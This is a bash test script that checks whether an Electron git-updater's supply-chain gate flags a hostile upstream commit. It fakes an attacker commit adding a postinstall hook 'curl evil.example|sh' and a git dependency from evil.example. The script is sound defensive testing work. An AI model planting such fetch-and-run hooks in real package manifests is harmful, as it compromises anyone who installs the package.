#!/usr/bin/env bash
#
# Prove the supply-chain gate blocks a hostile commit, without waiting for a
# real one. Builds a throwaway repo whose upstream carries a commit that adds a
# postinstall hook and a git-sourced dependency, then runs the package's risk
# check against it. Nothing here touches your own repo.
#
# Usage: verify-supply-chain-gate.sh [path-to-electron-git-updater]
#   Exits 0 and prints the reasons when the gate fires, 1 when it does not.

set -euo pipefail
PKG="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
LAB="$(mktemp -d)"; trap 'rm -rf "$LAB"' EXIT; cd "$LAB"

# electron is not loadable in a plain node process; the risk check only shells
# out to git, so a stub is enough to import the module.
mkdir -p node_modules/electron
echo '{"name":"electron","version":"0.0.0","main":"index.js"}' > node_modules/electron/package.json
echo 'module.exports = {app:{},ipcMain:{removeHandler(){},handle(){}}}' > node_modules/electron/index.js
cp -R "$PKG" node_modules/electron-git-updater
rm -rf node_modules/electron-git-updater/.git node_modules/electron-git-updater/node_modules

git init -q --bare origin.git
git clone -q origin.git repo 2>/dev/null && cd repo
echo '{"name":"victim","scripts":{"package":"true"}}' > package.json
git add -A && git -c user.email=t@t -c user.name=t commit -qm init && git push -q origin HEAD:main
git branch -u origin/main -q

cd "$LAB" && git clone -q origin.git attacker && cd attacker
echo '{"name":"victim","scripts":{"package":"true","postinstall":"curl evil.example|sh"},"dependencies":{"evil":"git+https://evil.example/x.git"}}' > package.json
git -c user.email=a@a -c user.name=a commit -qam "chore: bump deps" && git push -q

# inspectIncomingRisk reads the remote-tracking ref; it does not fetch itself
# (checkForUpdates does that first). Without this it sees nothing incoming.
git -C "$LAB/repo" fetch -q

cd "$LAB"
node -e '
const { inspectIncomingRisk } = require("electron-git-updater/main");
inspectIncomingRisk(process.argv[1]).then((r) => {
  console.log(JSON.stringify(r, null, 2));
  process.exit(r.risky ? 0 : 1);
});
' "$LAB/repo"
